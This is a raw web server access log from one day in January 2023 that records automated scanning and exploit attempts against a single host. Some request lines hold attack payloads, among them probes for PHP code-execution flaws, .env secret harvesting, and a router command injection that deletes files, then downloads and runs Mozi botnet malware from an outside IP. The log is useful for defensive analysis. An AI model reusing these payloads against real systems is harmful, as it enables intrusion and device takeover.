152.89.196.211 - - [15/Jan/2023:10:19:06 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:10:31:15 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:10:36:56 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.144.4.81 - - [15/Jan/2023:10:44:01 -0600] "-" 408 - "-" "-"
101.32.97.232 - - [15/Jan/2023:10:44:06 -0600] "o\xfa\xc0\xbe\xb8\xc0\xa4\xc9\x89\xa2\xc2\x8f\x83\xaf\x91\x97\xbe\xcd\xb9\xcf\xac\x9b\xb0\xab\xa0\xb6\xb1\xaa\x9d\x9c\x9f\x96\x8d\x93\xce\xb4\xb3\xb5\x98\xcd\xa6\xfa\xfa\xfa\xfa\x12\xfd\xd8\xf8\xfa\xfa\xc2\xfa\xfa\xfa\xfa\x1af\xec\xf9\xfa\xfa\xfa\xfa\xfb\xe5q\xf2\xfa\xfa\xfa\xfa\xfa\xfa\xf9wh\x97ui\xba\xea=E\xf0\x1b/\xa7XJ\xf11Y\v\xbf\xb1K\x1f" 400 226 "-" "-"
101.32.97.232 - - [15/Jan/2023:10:44:06 -0600] "\xff\xa2\xff" 400 226 "-" "-"
101.32.97.232 - - [15/Jan/2023:10:44:16 -0600] "-" 408 - "-" "-"
101.32.97.232 - - [15/Jan/2023:10:44:26 -0600] "-" 408 - "-" "-"
152.89.196.211 - - [15/Jan/2023:10:47:51 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:10:55:36 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [15/Jan/2023:11:14:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [15/Jan/2023:11:20:39 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:11:25:42 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:11:25:42 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:11:34:06 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:11:34:41 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:11:43:45 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.57 - - [15/Jan/2023:11:47:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [15/Jan/2023:11:50:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.143.186 - - [15/Jan/2023:12:02:17 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
143.110.222.166 - - [15/Jan/2023:12:03:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [15/Jan/2023:12:12:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [15/Jan/2023:12:19:05 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
191.15.244.51 - - [15/Jan/2023:12:59:36 -0600] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://191.210.99.42:35536/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 407 "-" "-"
143.110.222.166 - - [15/Jan/2023:13:03:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
90.151.171.108 - - [15/Jan/2023:13:05:22 -0600] "CONNECT v4.ident.me:443 HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.108 - - [15/Jan/2023:13:05:32 -0600] "GET http://v4.ident.me?Z71823167623Q1 HTTP/1.1" 301 247 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
80.94.92.57 - - [15/Jan/2023:13:36:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.35.18.107 - - [15/Jan/2023:13:37:06 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [15/Jan/2023:13:58:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [15/Jan/2023:14:06:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.29 - - [15/Jan/2023:14:25:18 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
185.254.196.223 - - [15/Jan/2023:14:25:31 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:14:25:31 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.189.12.72 - - [15/Jan/2023:14:52:57 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
80.85.241.15 - - [15/Jan/2023:14:56:25 -0600] "GET /phpmyadmin/index.php HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Linux; Android 9; JSN-AL00a Build/HONORJSN-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044807 Mobile Safari/537.36 MMWEBID/1961 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
80.85.241.15 - - [15/Jan/2023:14:56:25 -0600] "\x16\x03\x01" 400 226 "-" "-"
205.185.118.237 - - [15/Jan/2023:15:03:33 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [15/Jan/2023:15:06:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
142.93.223.77 - - [15/Jan/2023:15:18:01 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.2"
179.43.177.242 - - [15/Jan/2023:15:20:21 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
45.61.186.176 - - [15/Jan/2023:15:22:05 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
159.89.171.91 - - [15/Jan/2023:15:31:02 -0600] "\x16\x03\x01" 400 226 "-" "-"
159.89.171.91 - - [15/Jan/2023:15:31:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.171.91 - - [15/Jan/2023:15:31:03 -0600] "\x16\x03\x01" 400 226 "-" "-"
37.233.2.71 - - [15/Jan/2023:15:35:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.33.102.90 - - [15/Jan/2023:15:46:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [15/Jan/2023:16:06:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.199.110.12 - - [15/Jan/2023:16:12:30 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
95.217.229.40 - - [15/Jan/2023:16:24:39 -0600] "CONNECT www.google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
205.210.31.26 - - [15/Jan/2023:16:27:18 -0600] "GET / HTTP/1.1" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
179.43.177.242 - - [15/Jan/2023:16:55:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [15/Jan/2023:17:08:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.225.74.45 - - [15/Jan/2023:17:16:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:16:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:16:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:16:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:28 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.225.74.45 - - [15/Jan/2023:17:17:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.254.196.223 - - [15/Jan/2023:17:25:11 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:17:25:11 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
183.136.225.32 - - [15/Jan/2023:17:36:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
144.126.211.39 - - [15/Jan/2023:17:47:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
103.149.192.62 - - [15/Jan/2023:18:07:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
143.110.222.166 - - [15/Jan/2023:18:09:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
20.106.168.55 - - [15/Jan/2023:18:41:04 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.106.168.55 - - [15/Jan/2023:18:41:04 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.106.168.55 - - [15/Jan/2023:18:41:07 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.28.1"
192.241.238.12 - - [15/Jan/2023:18:57:01 -0600] "GET /druid/index.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [15/Jan/2023:19:09:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
113.242.210.250 - - [15/Jan/2023:19:35:28 -0600] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 404 "-" "-"
107.189.12.72 - - [15/Jan/2023:19:48:10 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
80.66.77.85 - - [15/Jan/2023:20:01:52 -0600] "GET /.env HTTP/1.0" 301 237 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
143.110.222.166 - - [15/Jan/2023:20:04:21 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
62.16.7.156 - - [15/Jan/2023:20:21:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.254.196.223 - - [15/Jan/2023:20:24:23 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:20:24:23 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
146.70.9.42 - - [15/Jan/2023:20:34:53 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
146.70.9.42 - - [15/Jan/2023:20:34:54 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
146.70.9.42 - - [15/Jan/2023:20:34:57 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.24.0"
191.103.250.193 - - [15/Jan/2023:20:52:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:10 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:10 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
